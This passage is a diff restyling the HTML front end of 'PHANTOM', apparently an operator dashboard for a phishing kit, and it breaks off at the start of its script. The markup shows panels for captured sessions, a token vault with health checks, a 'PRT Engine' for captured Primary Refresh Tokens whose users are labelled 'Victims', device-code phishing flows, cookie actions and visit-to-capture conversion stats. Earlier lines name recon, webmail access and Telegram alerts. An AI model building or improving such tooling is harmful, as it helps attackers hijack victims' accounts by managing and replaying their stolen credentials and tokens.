@@ -1,758 +1,553 @@
 <!DOCTYPE html>
-<html lang="en" data-theme="dark">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PHANTOM Dashboard</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <style>
-        :root {
-            --bg: #0a0a0f;
-            --card: #12121a;
-            --border: #1e1e2e;
-            --text: #cdd6f4;
-            --muted: #6c7086;
-            --accent: #cba6f7;
-            --green: #a6e3a1;
-            --red: #f38ba8;
-            --orange: #fab387;
-            --blue: #89b4fa;
-            --gold: #f9e2af;
-            --radius: 12px;
-            --shadow: 0 4px 24px rgba(0,0,0,0.4);
-        }
-        [data-theme="light"] {
-            --bg: #f5f5f9;
-            --card: #ffffff;
-            --border: #d0d0da;
-            --text: #1e1e2e;
-            --muted: #585b70;
-            --accent: #8839ef;
-            --green: #40a02b;
-            --red: #d20f39;
-            --orange: #fe640b;
-            --blue: #1e66f5;
-            --gold: #df8e1d;
-        }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700&display=swap');
+
         * { margin: 0; padding: 0; box-sizing: border-box; }
+
         body {
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-            background: var(--bg);
-            color: var(--text);
+            font-family: 'Inter', sans-serif;
+            background: radial-gradient(circle at 20% 30%, #0a0e17, #030507);
             min-height: 100vh;
-            transition: all 0.3s ease;
+            padding: 24px;
+            color: #e0e8f0;
+            transition: background 0.4s ease, color 0.4s ease;
         }
-        .sidebar {
-            position: fixed;
-            left: 0; top: 0; bottom: 0;
-            width: 240px;
-            background: var(--card);
-            border-right: 1px solid var(--border);
-            padding: 20px 0;
-            z-index: 100;
-            overflow-y: auto;
+
+        .glass {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(16px) saturate(180%);
+            -webkit-backdrop-filter: blur(16px) saturate(180%);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 24px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6), inset 0 0 0 1px rgba(255, 255, 255, 0.03);
+            transition: background 0.4s ease, border 0.4s ease, box-shadow 0.4s ease;
         }
-        .sidebar .logo {
-            padding: 0 20px 20px;
-            font-size: 22px;
-            font-weight: 800;
-            letter-spacing: -0.5px;
-            border-bottom: 1px solid var(--border);
-            margin-bottom: 10px;
+
+        .container { max-width: 1440px; margin: 0 auto; }
+
+        body.light-glass {
+            background: radial-gradient(circle at 20% 30%, #e8edf5, #d0d8e5);
+            color: #1a1f2a;
         }
-        .sidebar .logo span { color: var(--accent); }
-        .sidebar nav a {
-            display: flex; align-items: center; gap: 10px;
-            padding: 12px 20px;
-            color: var(--muted);
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-            transition: all 0.2s;
-            border-left: 3px solid transparent;
+        body.light-glass .glass {
+            background: rgba(255, 255, 255, 0.25);
+            backdrop-filter: blur(20px) saturate(180%);
+            -webkit-backdrop-filter: blur(20px) saturate(180%);
+            border: 1px solid rgba(255, 255, 255, 0.35);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08), inset 0 0 0 1px rgba(255, 255, 255, 0.2);
         }
-        .sidebar nav a:hover, .sidebar nav a.active {
-            color: var(--text);
-            background: var(--bg);
-            border-left-color: var(--accent);
+        body.light-glass .header h1 {
+            background: linear-gradient(135deg, #4a2c8a, #2a5f8a);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
-        .sidebar nav a .icon { font-size: 18px; width: 24px; text-align: center; }
-        .main {
-            margin-left: 240px;
-            padding: 30px;
+        body.light-glass .stat-card .value {
+            background: linear-gradient(135deg, #1a1f2a, #3a4f6a);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
-        .header {
-            display: flex; justify-content: space-between; align-items: center;
-            margin-bottom: 30px;
-            flex-wrap: wrap;
-            gap: 12px;
+        body.light-glass .stat-card label,
+        body.light-glass .stat-card .sub { color: rgba(0, 0, 0, 0.6); }
+        body.light-glass .badge { background: rgba(0, 0, 0, 0.08); color: #1a1f2a; border-color: rgba(0, 0, 0, 0.1); }
+        body.light-glass .action-btn { color: #1a1f2a; border-color: rgba(0, 0, 0, 0.15); }
+        body.light-glass .action-btn:hover { background: rgba(0, 0, 0, 0.06); }
+        body.light-glass .action-btn.cookie { border-color: rgba(200, 150, 0, 0.3); color: #b8860b; }
+        body.light-glass .toolbar input,
+        body.light-glass .toolbar select {
+            background: rgba(255, 255, 255, 0.3);
+            border-color: rgba(0, 0, 0, 0.1);
+            color: #1a1f2a;
         }
-        .header h1 { font-size: 28px; font-weight: 700; }
-        .header-actions {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
+        body.light-glass .toolbar input::placeholder { color: rgba(0, 0, 0, 0.4); }
+        body.light-glass .toolbar input:focus,
+        body.light-glass .toolbar select:focus {
+            border-color: #7c4dff;
+            box-shadow: 0 0 0 3px rgba(124, 77, 255, 0.2);
         }
-        .btn {
-            background: var(--card);
-            border: 1px solid var(--border);
-            color: var(--text);
-            padding: 8px 16px;
-            border-radius: 40px;
-            cursor: pointer;
-            font-size: 13px;
-            font-weight: 600;
-            transition: all 0.2s;
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            text-decoration: none;
+        body.light-glass .toolbar select option { background: #f0f4ff; color: #1a1f2a; }
+        body.light-glass .btn { color: #1a1f2a; border-color: rgba(0, 0, 0, 0.1); background: rgba(255, 255, 255, 0.2); }
+        body.light-glass .btn:hover { background: rgba(255, 255, 255, 0.4); }
+        body.light-glass .btn-primary {
+            background: linear-gradient(135deg, #536dfe, #7c4dff);
+            color: #fff;
+            border-color: transparent;
         }
-        .btn:hover { opacity: 0.85; transform: scale(1.02); }
-        .btn-primary { background: var(--accent); color: #000; border-color: transparent; }
-        .btn-gold { background: transparent; border-color: var(--gold); color: var(--gold); }
-        .btn-gold:hover { background: rgba(249,226,175,0.1); }
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-            gap: 16px;
-            margin-bottom: 30px;
+        body.light-glass .btn-primary:hover { background: linear-gradient(135deg, #6a7ffc, #9464ff); }
+        body.light-glass .btn-gold { border-color: rgba(180, 130, 0, 0.4); color: #8b6914; }
+        body.light-glass .btn-gold:hover { background: rgba(180, 130, 0, 0.1); }
+        body.light-glass .modal-content {
+            background: rgba(255, 255, 255, 0.3);
+            backdrop-filter: blur(20px);
+            border-color: rgba(255, 255, 255, 0.4);
         }
-        .stat-card {
-            background: var(--card);
-            border: 1px solid var(--border);
-            border-radius: var(--radius);
-            padding: 20px;
-            box-shadow: var(--shadow);
-            transition: transform 0.2s;
+        body.light-glass .modal pre { background: rgba(0, 0, 0, 0.05); border-color: rgba(0, 0, 0, 0.1); }
+        body.light-glass .toast { background: rgba(255, 255, 255, 0.9); color: #1a1f2a; border-color: rgba(0, 0, 0, 0.1); }
+        body.light-glass .ws-dot.online { background: #2b8c3e; box-shadow: 0 0 12px #2b8c3e; }
+        body.light-glass .ws-dot.offline { background: #c92a2a; box-shadow: 0 0 12px #c92a2a; }
+        body.light-glass .tab { color: rgba(0,0,0,0.4); background: rgba(0,0,0,0.02); border-color: rgba(0,0,0,0.05); }
+        body.light-glass .tab:hover { color: rgba(0,0,0,0.7); }
+        body.light-glass .tab.active { background: rgba(124,77,255,0.15); border-color: rgba(124,77,255,0.2); color: #4a2c8a; }
+        body.light-glass .leaflet-control-zoom a { background: rgba(255, 255, 255, 0.3) !important; color: #1a1f2a !important; border-color: rgba(0, 0, 0, 0.1) !important; }
+        body.light-glass .leaflet-popup-content-wrapper { background: rgba(255, 255, 255, 0.9) !important; color: #1a1f2a !important; border-color: rgba(0, 0, 0, 0.1) !important; }
+
+        .tabs {
+            display: flex; gap: 4px; padding: 4px; margin-bottom: 24px; overflow-x: auto;
         }
-        .stat-card:hover { transform: translateY(-2px); }
-        .stat-card .label { font-size: 12px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
-        .stat-card .value { font-size: 32px; font-weight: 700; }
-        .stat-card .sub { font-size: 12px; color: var(--muted); margin-top: 4px; }
-        .value.green { color: var(--green); }
-        .value.accent { color: var(--accent); }
-        .value.orange { color: var(--orange); }
-        .panel {
-            background: var(--card);
-            border: 1px solid var(--border);
-            border-radius: var(--radius);
-            padding: 20px;
-            margin-bottom: 20px;
-            box-shadow: var(--shadow);
+        .tab {
+            padding: 10px 24px; border-radius: 40px; cursor: pointer; font-size: 14px; font-weight: 500;
+            transition: all 0.2s; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.05);
+            color: rgba(255,255,255,0.5); white-space: nowrap;
         }
-        .panel h3 { margin-bottom: 15px; font-size: 16px; font-weight: 600; }
-        table { width: 100%; border-collapse: collapse; font-size: 13px; }
-        th { text-align: left; padding: 10px 8px; border-bottom: 2px solid var(--border); color: var(--muted); font-weight: 600; text-transform: uppercase; font-size: 11px; letter-spacing: 0.5px; }
-        td { padding: 10px 8px; border-bottom: 1px solid var(--border); }
-        .badge {
-            display: inline-block;
-            padding: 4px 10px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-weight: 600;
-        }
-        .badge.enabled { background: rgba(166,227,161,0.15); color: var(--green); }
-        .badge.disabled { background: rgba(243,139,168,0.15); color: var(--red); }
-        .btn-sm { padding: 4px 10px; font-size: 11px; border-radius: 30px; }
-        .hidden { display: none !important; }
+        .tab:hover { background: rgba(255,255,255,0.06); color: rgba(255,255,255,0.8); }
+        .tab.active { background: rgba(124,77,255,0.2); border-color: rgba(124,77,255,0.3); color: #b388ff; }
         .tab-content { display: none; }
         .tab-content.active { display: block; }
-        .toast {
-            position: fixed; bottom: 20px; right: 20px;
-            background: var(--green); color: #000;
-            padding: 12px 20px; border-radius: 8px;
-            font-weight: 600; z-index: 9999;
-            opacity: 0; transform: translateY(20px);
-            transition: all 0.3s ease;
+
+        .header {
+            display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;
+            gap: 16px; padding: 20px 28px; margin-bottom: 28px;
         }
-        .toast.show { opacity: 1; transform: translateY(0); }
-        .toast.error { background: var(--red); color: #fff; }
-        .loading { text-align: center; padding: 40px; color: var(--muted); }
-        .loading::after { content: '...'; animation: dots 1.5s infinite; }
-        @keyframes dots { 0%,20% { content: '.'; } 40% { content: '..'; } 60%,100% { content: '...'; } }
-        textarea { width: 100%; height: 120px; background: var(--bg); border: 1px solid var(--border); color: var(--text); padding: 10px; border-radius: 8px; font-family: monospace; font-size: 12px; resize: vertical; }
-        input, select { background: var(--bg); border: 1px solid var(--border); color: var(--text); padding: 8px 12px; border-radius: 6px; font-size: 13px; width: 100%; margin-bottom: 8px; }
-        .flex-row { display: flex; gap: 10px; flex-wrap: wrap; }
-        .flex-row > * { flex: 1; min-width: 150px; }
+        .header h1 {
+            font-weight: 700; font-size: 26px;
+            background: linear-gradient(135deg, #b388ff, #82b1ff);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+            letter-spacing: -0.5px;
+        }
+        .header-actions { display: flex; gap: 12px; align-items: center; flex-wrap: wrap; }
+
+        .btn {
+            background: rgba(255, 255, 255, 0.06); border: 1px solid rgba(255, 255, 255, 0.12);
+            color: #e0e8f0; padding: 8px 18px; border-radius: 40px; font-weight: 500; font-size: 13px;
+            cursor: pointer; transition: all 0.2s; backdrop-filter: blur(4px);
+            display: inline-flex; align-items: center; gap: 6px; text-decoration: none;
+        }
+        .btn:hover { background: rgba(255, 255, 255, 0.14); border-color: rgba(255, 255, 255, 0.25); box-shadow: 0 0 20px rgba(130, 177, 255, 0.15); }
+        .btn-primary { background: linear-gradient(135deg, #536dfe, #7c4dff); border-color: transparent; color: #fff; box-shadow: 0 4px 15px rgba(83, 109, 254, 0.3); }
+        .btn-primary:hover { background: linear-gradient(135deg, #6a7ffc, #9464ff); box-shadow: 0 4px 25px rgba(83, 109, 254, 0.5); border-color: transparent; }
+        .btn-gold { background: transparent; border-color: rgba(255, 215, 0, 0.3); color: #ffd700; }
+        .btn-gold:hover { background: rgba(255, 215, 0, 0.08); border-color: #ffd700; box-shadow: 0 0 20px rgba(255, 215, 0, 0.15); }
+        .btn-success { background: linear-gradient(135deg, #00c853, #00e676); border-color: transparent; color: #fff; }
+        .btn-sm { padding: 4px 12px; font-size: 11px; border-radius: 30px; }
+
+        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 16px; margin-bottom: 28px; }
+        .stat-card { padding: 18px 22px; display: flex; flex-direction: column; }
+        .stat-card label { font-size: 12px; text-transform: uppercase; letter-spacing: 0.05em; color: rgba(255, 255, 255, 0.5); margin-bottom: 4px; }
+        .stat-card .value { font-size: 32px; font-weight: 700; background: linear-gradient(135deg, #f0f4ff, #b0c4ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+        .stat-card .sub { font-size: 13px; color: rgba(255, 255, 255, 0.5); margin-top: 4px; }
+
+        .toolbar { display: flex; flex-wrap: wrap; gap: 12px; align-items: center; padding: 16px 24px; margin-bottom: 24px; }
+        .toolbar input, .toolbar select {
+            background: rgba(255, 255, 255, 0.06); border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 40px; padding: 8px 18px; color: #e0e8f0; font-size: 13px; outline: none;
+            transition: 0.2s; backdrop-filter: blur(4px);
+        }
+        .toolbar input:focus, .toolbar select:focus { border-color: #7c4dff; box-shadow: 0 0 0 3px rgba(124, 77, 255, 0.2); }
+        .toolbar input::placeholder { color: rgba(255, 255, 255, 0.3); }
+        .toolbar select option { background: #1a1f2a; color: #e0e8f0; }
+
+        .ws-status { margin-left: auto; font-size: 13px; display: flex; align-items: center; gap: 6px; }
+        .ws-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; }
+        .ws-dot.online { background: #69db7c; box-shadow: 0 0 12px #69db7c; }
+        .ws-dot.offline { background: #ff6b6b; box-shadow: 0 0 12px #ff6b6b; }
+
+        .table-wrap { overflow-x: auto; padding: 4px; margin-bottom: 24px; }
+        table { width: 100%; border-collapse: collapse; font-size: 14px; }
+        th { text-align: left; padding: 14px 16px; font-weight: 600; font-size: 11px; text-transform: uppercase; letter-spacing: 0.05em; color: rgba(255, 255, 255, 0.4); border-bottom: 1px solid rgba(255, 255, 255, 0.06); }
+        td { padding: 14px 16px; border-bottom: 1px solid rgba(255, 255, 255, 0.04); color: rgba(255, 255, 255, 0.8); }
+        tr:hover td { background: rgba(255, 255, 255, 0.04); }
+
+        .badge { background: rgba(130, 177, 255, 0.15); padding: 2px 12px; border-radius: 40px; font-size: 12px; color: #82b1ff; border: 1px solid rgba(130, 177, 255, 0.1); display: inline-block; }
+        .badge-success { background: rgba(0, 200, 83, 0.15); color: #69db7c; border-color: rgba(0, 200, 83, 0.2); }
+        .badge-danger { background: rgba(255, 23, 68, 0.15); color: #ff6b6b; border-color: rgba(255, 23, 68, 0.2); }
+        .badge-warning { background: rgba(255, 109, 0, 0.15); color: #ffab40; border-color: rgba(255, 109, 0, 0.2); }
+
+        .action-btn { background: transparent; border: 1px solid rgba(255, 255, 255, 0.1); color: #e0e8f0; padding: 4px 12px; border-radius: 30px; font-size: 12px; cursor: pointer; transition: 0.2s; margin-right: 6px; }
+        .action-btn:hover { background: rgba(255, 255, 255, 0.08); border-color: rgba(255, 255, 255, 0.2); }
+        .action-btn.cookie { border-color: rgba(255, 215, 0, 0.2); color: #ffd700; }
+        .action-btn.cookie:hover { background: rgba(255, 215, 0, 0.08); border-color: #ffd700; }
+
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-bottom: 24px; }
+        .map-container { height: 300px; border-radius: 20px; overflow: hidden; background: rgba(0, 0, 0, 0.3); }
+        #map { height: 100%; width: 100%; background: transparent; }
+        .chart-container { height: 300px; padding: 16px; }
+        .chart-container canvas { width: 100% !important; height: 100% !important; }
+
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(12px); z-index: 2000; justify-content: center; align-items: center; }
+        .modal-content { max-width: 800px; width: 90%; max-height: 80vh; padding: 28px; overflow-y: auto; position: relative; }
+        .modal-close { position: sticky; top: 0; float: right; background: rgba(255, 107, 107, 0.15); border: 1px solid rgba(255, 107, 107, 0.2); color: #ff6b6b; padding: 6px 16px; border-radius: 40px; cursor: pointer; font-weight: 500; transition: 0.2s; }
+        .modal-close:hover { background: rgba(255, 107, 107, 0.25); }
+        .modal pre { background: rgba(0, 0, 0, 0.3); padding: 16px; border-radius: 12px; overflow-x: auto; font-size: 12px; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgba(255, 255, 255, 0.05); }
+
+        .toast { position: fixed; bottom: 24px; right: 24px; background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); color: #e0e8f0; padding: 14px 24px; border-radius: 40px; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6); z-index: 3000; animation: slideUp 0.3s ease; }
+        .toast.error { border-color: rgba(255, 107, 107, 0.3); }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
         @media (max-width: 768px) {
-            .sidebar { width: 60px; }
-            .sidebar .logo { font-size: 0; padding: 10px; }
-            .sidebar nav a span:not(.icon) { display: none; }
-            .main { margin-left: 60px; padding: 15px; }
-            .stats-grid { grid-template-columns: repeat(2, 1fr); }
+            .grid-2 { grid-template-columns: 1fr; }
             .header { flex-direction: column; align-items: stretch; }
-            .header-actions { justify-content: flex-start; }
+            .toolbar { flex-direction: column; align-items: stretch; }
+            .ws-status { margin-left: 0; justify-content: flex-end; }
+            .tabs { gap: 2px; }
+            .tab { padding: 6px 14px; font-size: 12px; }
         }
+
+        .leaflet-control-zoom a { background: rgba(255, 255, 255, 0.08) !important; color: #e0e8f0 !important; border-color: rgba(255, 255, 255, 0.1) !important; }
+        .leaflet-popup-content-wrapper { background: rgba(20, 25, 35, 0.9) !important; backdrop-filter: blur(12px) !important; color: #e0e8f0 !important; border: 1px solid rgba(255, 255, 255, 0.05) !important; }
     </style>
 </head>
 <body>
-    <aside class="sidebar">
-        <div class="logo">😈 <span>PHANTOM</span></div>
-        <nav>
-            <a href="#" data-tab="dashboard" class="active"><span class="icon">📊</span> Dashboard</a>
-            <a href="#" data-tab="sessions"><span class="icon">📋</span> Sessions</a>
-            <a href="#" data-tab="vault"><span class="icon">🏛️</span> Token Vault</a>
-            <a href="#" data-tab="analytics"><span class="icon">📈</span> Analytics</a>
-            <a href="#" data-tab="device"><span class="icon">📱</span> Device Code</a>
-            <a href="#" data-tab="prt"><span class="icon">🔐</span> PRT Engine</a>
-            <a href="#" data-tab="recon"><span class="icon">🔍</span> Recon</a>
-            <a href="#" data-tab="webmail"><span class="icon">📧</span> Webmail</a>
-        </nav>
-    </aside>
-
-    <main class="main">
-        <div class="header">
-            <h1 id="pageTitle">📊 Dashboard</h1>
-            <div class="header-actions">
-                <button class="btn" onclick="toggleTheme()">🌓 Theme</button>
-                <button class="btn btn-gold" onclick="window.open('/device','_blank')">📱 Device Code</button>
-            </div>
+<div class="container">
+    <header class="header glass">
+        <h1>😈 PHANTOM</h1>
+        <div class="header-actions">
+            <button class="btn" onclick="toggleTheme()">🌓 Theme</button>
+            <button class="btn btn-primary" onclick="exportAll()">📦 Export ZIP</button>
+            <button class="btn btn-gold" onclick="window.open('/device','_blank')">📱 Device Code</button>
         </div>
+    </header>
 
-        <!-- Stats Grid -->
-        <div class="stats-grid" id="statsGrid">
-            <div class="stat-card"><div class="label">Total Sessions</div><div class="value accent" id="statSessions">--</div><div class="sub">Captured</div></div>
-            <div class="stat-card"><div class="label">Status</div><div class="value green" id="statStatus">✅ Online</div><div class="sub">System ready</div></div>
-            <div class="stat-card"><div class="label">Total Visits</div><div class="value" id="statVisits">--</div><div class="sub">All time</div></div>
-            <div class="stat-card"><div class="label">Unique IPs</div><div class="value orange" id="statUniqueIPs">--</div><div class="sub">Unique visitors</div></div>
-            <div class="stat-card"><div class="label">Today</div><div class="value" id="statToday">--</div><div class="sub">Last 24 hours</div></div>
+    <div class="stats">
+        <div class="stat-card glass"><label>Total Sessions</label><div class="value" id="total">0</div><div class="sub">Captured</div></div>
+        <div class="stat-card glass"><label>Last Capture</label><div class="value" id="last">Never</div><div class="sub">Latest session</div></div>
+        <div class="stat-card glass"><label>Status</label><div class="value" id="status">✅ Online</div><div class="sub">System ready</div></div>
+    </div>
+
+    <div class="stats">
+        <div class="stat-card glass"><label>Total Visits</label><div class="value" id="totalVisits">0</div><div class="sub">All time</div></div>
+        <div class="stat-card glass"><label>Unique IPs</label><div class="value" id="uniqueIPs">0</div><div class="sub">Unique visitors</div></div>
+        <div class="stat-card glass"><label>Today</label><div class="value" id="todayVisits">0</div><div class="sub">Last 24 hours</div></div>
+    </div>
+
+    <div class="tabs glass">
+        <div class="tab active" data-tab="dashboard" onclick="switchTab('dashboard')">📊 Dashboard</div>
+        <div class="tab" data-tab="vault" onclick="switchTab('vault')">🏛️ Token Vault</div>
+        <div class="tab" data-tab="prt" onclick="switchTab('prt')">🔐 PRT Engine</div>
+        <div class="tab" data-tab="analytics" onclick="switchTab('analytics')">📈 Analytics</div>
+        <div class="tab" data-tab="device" onclick="switchTab('device')">📱 Device Code</div>
+    </div>
+
+    <div id="tab-dashboard" class="tab-content active">
+        <div class="toolbar glass">
+            <input type="text" id="searchInput" placeholder="Search by username, IP, domain..." oninput="filterTable()">
+            <select id="filterDate" onchange="filterTable()">
+                <option value="all">All Time</option>
+                <option value="today">Today</option>
+                <option value="week">This Week</option>
+            </select>
+            <button class="btn" onclick="refreshLogs()">🔄 Refresh</button>
+            <div class="ws-status"><span class="ws-dot offline" id="wsDot"></span><span id="wsLabel">Connecting...</span></div>
         </div>
+        <div class="table-wrap glass" style="padding: 8px;">
+            <table><thead><tr><th>File</th><th>Size</th><th>Modified</th><th>Username</th><th>IP</th><th>Actions</th></tr></thead><tbody id="logTable"></tbody></table>
+        </div>
+        <div class="grid-2">
+            <div class="map-container glass"><div id="map"></div></div>
+            <div class="chart-container glass"><canvas id="captureChart"></canvas></div>
+        </div>
+    </div>
 
-        <!-- DASHBOARD TAB -->
-        <div class="tab-content active" id="tab-dashboard">
-            <div class="panel"><h3>🔄 Quick Actions</h3>
-                <div class="flex-row">
-                    <button class="btn" onclick="refreshAll()">🔄 Refresh All</button>
-                    <button class="btn btn-primary" onclick="exportZip()">📦 Export ZIP</button>
-                    <button class="btn" onclick="testTelegram()">📤 Test Telegram</button>
+    <div id="tab-vault" class="tab-content">
+        <div class="toolbar glass">
+            <button class="btn btn-primary" onclick="scanVault()">🔍 Scan Logs</button>
+            <button class="btn btn-success" onclick="healthCheckVault()">🩺 Health Check</button>
+            <span style="margin-left:auto;font-size:13px;color:rgba(255,255,255,0.4);" id="vaultStats">Loading...</span>
+        </div>
+        <div class="table-wrap glass" style="padding: 8px;">
+            <table><thead><tr><th>Username</th><th>Type</th><th>Status</th><th>Source</th><th>Timestamp</th><th>Actions</th></tr></thead><tbody id="vaultTable"><tr><td colspan="6" style="text-align:center;color:rgba(255,255,255,0.3);padding:20px;">No tokens in vault. Click "Scan Logs".</td></tr></tbody></table>
+        </div>
+    </div>
+
+    <div id="tab-prt" class="tab-content">
+        <div class="toolbar glass">
+            <button class="btn btn-primary" onclick="scanPRTs()">🔍 Scan PRTs</button>
+            <button class="btn btn-success" onclick="healthCheckPRTs()">🩺 Health Check</button>
+            <button class="btn" onclick="exchangeAllPRTs()">🔄 Exchange All</button>
+            <span style="margin-left:auto;font-size:13px;color:rgba(255,255,255,0.4);" id="prtStats">📊 0 PRTs · 0 users</span>
+        </div>
+        <div class="stats">
+            <div class="stat-card glass"><label>Total PRTs</label><div class="value" id="prtTotal">0</div><div class="sub">Captured</div></div>
+            <div class="stat-card glass"><label>Unique Users</label><div class="value" id="prtUsers">0</div><div class="sub">Victims</div></div>
+            <div class="stat-card glass"><label>Healthy PRTs</label><div class="value" id="prtHealthy">0</div><div class="sub">Active</div></div>
+        </div>
+        <div class="table-wrap glass" style="padding: 8px;">
+            <table><thead><tr><th>Username</th><th>PRT</th><th>Source</th><th>Captured</th><th>Status</th><th>Actions</th></tr></thead><tbody id="prtTable"><tr><td colspan="6" style="text-align:center;color:rgba(255,255,255,0.3);padding:20px;">No PRTs found. Click "Scan PRTs".</td></tr></tbody></table>
+        </div>
+    </div>
+
+    <div id="tab-analytics" class="tab-content">
+        <div class="stats" id="analyticsStats">
+            <div class="stat-card glass"><label>Visits</label><div class="value" id="analyticsVisits">0</div><div class="sub">Total</div></div>
+            <div class="stat-card glass"><label>Captures</label><div class="value" id="analyticsCaptures">0</div><div class="sub">Total</div></div>
+            <div class="stat-card glass"><label>Conversion</label><div class="value" id="analyticsConversion">0%</div><div class="sub">Visits → Captures</div></div>
+            <div class="stat-card glass"><label>Unique IPs</label><div class="value" id="analyticsUniqueIPs">0</div><div class="sub">Total</div></div>
+        </div>
+        <div class="grid-2">
+            <div class="chart-container glass"><h4 style="color:rgba(255,255,255,0.5);font-weight:400;margin-bottom:12px;">📊 Daily Captures</h4><canvas id="analyticsChart"></canvas></div>
+            <div class="glass" style="padding:16px;">
+                <h4 style="color:rgba(255,255,255,0.5);font-weight:400;margin-bottom:12px;">🏆 Top Domains</h4>
+                <div id="topDomainsList" style="color:rgba(255,255,255,0.6);font-size:14px;"><p style="color:rgba(255,255,255,0.3);">Loading...</p></div>
+                <div style="margin-top:16px;">
+                    <h4 style="color:rgba(255,255,255,0.5);font-weight:400;margin-bottom:12px;">📈 Conversion Rate</h4>
+                    <div id="conversionDetails" style="color:rgba(255,255,255,0.6);font-size:14px;"><p style="color:rgba(255,255,255,0.3);">Loading...</p></div>
                 </div>
             </div>
-            <div class="panel"><h3>📋 Recent Sessions</h3><div id="recentSessions"><div class="loading">Loading</div></div></div>
         </div>
+    </div>
 
-        <!-- SESSIONS TAB -->
-        <div class="tab-content" id="tab-sessions">
-            <div class="panel"><h3>📋 All Sessions</h3><div id="allSessions"><div class="loading">Loading</div></div></div>
+    <div id="tab-device" class="tab-content">
+        <div class="toolbar glass">
+            <button class="btn btn-primary" onclick="startDeviceFlow()">🚀 Start New Flow</button>
+            <button class="btn" onclick="refreshDeviceHistory()">🔄 Refresh</button>
+            <span style="margin-left:auto;font-size:13px;color:rgba(255,255,255,0.4);" id="deviceStats">📊 0 flows · 0 approved</span>
         </div>
-
-        <!-- VAULT TAB -->
-        <div class="tab-content" id="tab-vault">
-            <div class="panel">
-                <h3>🏛️ Token Vault</h3>
-                <div class="flex-row" style="margin-bottom:15px">
-                    <button class="btn btn-primary" onclick="scanVault()">🔍 Scan Logs</button>
-                    <button class="btn" onclick="healthCheckVault()">💚 Health Check</button>
-                </div>
-                <div id="vaultStats"></div>
-                <div id="vaultTokens"><div class="loading">Scan logs to see tokens</div></div>
-            </div>
+        <div class="stats">
+            <div class="stat-card glass"><label>Active Flows</label><div class="value" id="activeFlows">0</div><div class="sub">Waiting</div></div>
+            <div class="stat-card glass"><label>Approved</label><div class="value" id="approvedFlows">0</div><div class="sub">Captures</div></div>
+            <div class="stat-card glass"><label>Expired</label><div class="value" id="expiredFlows">0</div><div class="sub">Timed out</div></div>
         </div>
-
-        <!-- ANALYTICS TAB -->
-        <div class="tab-content" id="tab-analytics">
-            <div class="panel"><h3>📈 Analytics</h3><div id="analyticsData"><div class="loading">Loading</div></div></div>
+        <div class="table-wrap glass" style="padding: 8px;">
+            <table><thead><tr><th>Code</th><th>Status</th><th>Created</th><th>Approved</th><th>Actions</th></tr></thead><tbody id="deviceHistoryTable"><tr><td colspan="5" style="text-align:center;color:rgba(255,255,255,0.3);padding:20px;">No device flows yet.</td></tr></tbody></table>
         </div>
+    </div>
+</div>
 
-        <!-- DEVICE CODE TAB -->
-        <div class="tab-content" id="tab-device">
-            <div class="panel">
-                <h3>📱 Device Code Authentication</h3>
-                <div class="flex-row" style="margin-bottom:15px">
-                    <button class="btn btn-primary" onclick="window.open('/device','_blank')">🚀 Open Device Page</button>
-                    <button class="btn" onclick="requestDeviceCode()">🔑 Request Code</button>
-                    <button class="btn" onclick="loadDeviceHistory()">📋 History</button>
-                </div>
-                <div id="deviceResult"></div>
-                <div id="deviceHistory"></div>
-            </div>
-        </div>
+<div class="modal" id="modal">
+    <div class="modal-content glass">
+        <button class="modal-close" onclick="closeModal()">✕ Close</button>
+        <h3 id="modalTitle" style="margin-bottom:12px;">Details</h3>
+        <div id="modalBody"></div>
+    </div>
+</div>
+<div id="toastContainer"></div>
 
-        <!-- PRT TAB -->
-        <div class="tab-content" id="tab-prt">
-            <div class="panel">
-                <h3>🔐 PRT Engine</h3>
-                <div class="flex-row" style="margin-bottom:15px">
-                    <button class="btn btn-primary" onclick="scanPRTs()">🔍 Scan PRTs</button>
-                    <button class="btn" onclick="healthAllPRTs()">💚 Health All</button>
-                    <button class="btn" onclick="exchangeAllPRTs()">🔄 Exchange All</button>
-                </div>
-                <div id="prtStats"></div>
-                <div id="prtList"><div class="loading">Scan to see PRTs</div></div>
-            </div>
-        </div>
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script>
+    // =============================================
+    // GLOBALS
+    // =============================================
+    let allLogs = []; let map = null; let chart = null; let analyticsChart = null;
+    let reconnectAttempts = 0; const maxReconnectAttempts = 20; let ws;
